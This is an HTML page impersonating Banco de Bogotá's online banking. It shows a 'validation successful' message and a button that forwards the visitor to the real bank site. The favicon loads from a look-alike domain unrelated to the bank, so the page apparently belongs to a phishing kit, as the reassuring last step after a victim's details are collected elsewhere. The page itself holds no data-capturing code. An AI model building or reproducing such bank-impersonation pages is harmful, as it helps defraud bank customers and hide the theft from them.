<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="https://bogocota.site/assets/img/logo.png">
    <title>Banca Virtual - Validación Exitosa</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 440px;
            width: 100%;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        /* MOBILE */
        .header {
            padding: 24px 20px;
            border-bottom: none;
            text-align: center;
        }

        .logo {
            width: 200px;
            height: auto;
            margin: 0 auto 20px;
        }

        .logo img {
            width: 100%;
            height: auto;
            object-fit: contain;
        }

        .banner {
            background: linear-gradient(135deg, #0043A9 0%, #003090 100%);
            padding: 40px 20px;
            text-align: center;
            position: relative;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            border-radius: 0;
        }

        .check-icon {
            width: 120px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .check-icon svg {
            width: 100%;
            height: 100%;
        }

        .confirmation-img img {
            width: 100%;
            height: auto;
            object-fit: contain;
        }

        .content {
            padding: 30px 20px;
            text-align: center;
        }

        .success-title {
            color: #0043A9;
            font-size: 22px;
            font-weight: 700;
            margin: 20px 0 16px;
        }

        .success-text {
            color: #333;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .success-text strong {
            color: #000;
            font-weight: 700;
        }

        .btn-success {
            width: 90%;
            padding: 14px 20px;
            background-color: #0043A9;
            color: white;
            border: none;
            border-radius: 100px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 0 auto;
            display: block;
        }

        .btn-success:hover {
            background-color: #003090;
        }

        .btn-success:active {
            transform: scale(0.98);
        }

        .footer {
            padding: 16px 20px;
            text-align: center;
            border-top: 1px solid #e5e5e5;
            font-size: 12px;
            color: #999;
            background-color: white;
        }

        /* DESKTOP 1024px+ */
        @media screen and (min-width: 1024px) {
            body {
                padding: 40px 20px;
                justify-content: flex-start;
            }

            .container {
                max-width: 600px;
                border-radius: 16px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
                display: flex;
                flex-direction: column;
            }

            .header {
                padding: 40px 40px 0;
                border-bottom: none;
                text-align: left;
                background: white;
            }

            .logo {
                width: 180px;
                height: auto;
                margin: 0 0 20px 0;
            }

            .banner {
                background: linear-gradient(135deg, #0043A9 0%, #003090 100%);
                padding: 50px 40px;
                text-align: center;
                min-height: 240px;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .check-icon {
                width: 150px;
                height: 150px;
            }

            .content {
                padding: 50px 40px;
                background: white;
                text-align: center;
            }

            .success-title {
                font-size: 28px;
                margin: 24px 0 20px;
            }

            .success-text {
                font-size: 16px;
                margin-bottom: 40px;
            }

            .btn-success {
                width: 85%;
                padding: 16px 40px;
                font-size: 17px;
                border-radius: 50px;
                box-shadow: 0 2px 8px rgba(0, 67, 169, 0.2);
            }

            .btn-success:hover {
                box-shadow: 0 4px 12px rgba(0, 67, 169, 0.3);
            }

            .footer {
                padding: 20px 40px;
                background: #fafbfc;
                border-top: 1px solid #e5e5e5;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <img src="bancoboga.png" alt="Banco de Bogotá">
            </div>
        </div>

        <div class="banner">
            <div class="check-icon">
                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="50" fill="white"/>
                    <path d="M 30 50 L 45 65 L 70 35" stroke="#0043A9" stroke-width="4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
        </div>

        <div class="content">
            <h3 class="success-title">¡Proceso de validación exitoso!</h3>
            
            <p class="success-text">
                Continúe usando los servicios de la<br>
                <strong>Banca Virtual Banco de Bogotá.</strong>
            </p>

            <form action="https://www.bancodebogota.com/personas" method="post">
                <button type="submit" class="btn-success">Entendido</button>
            </form>
        </div>

        <div class="footer">
            <p>v.1.30.0</p>
        </div>
    </div>
</body>
</html>
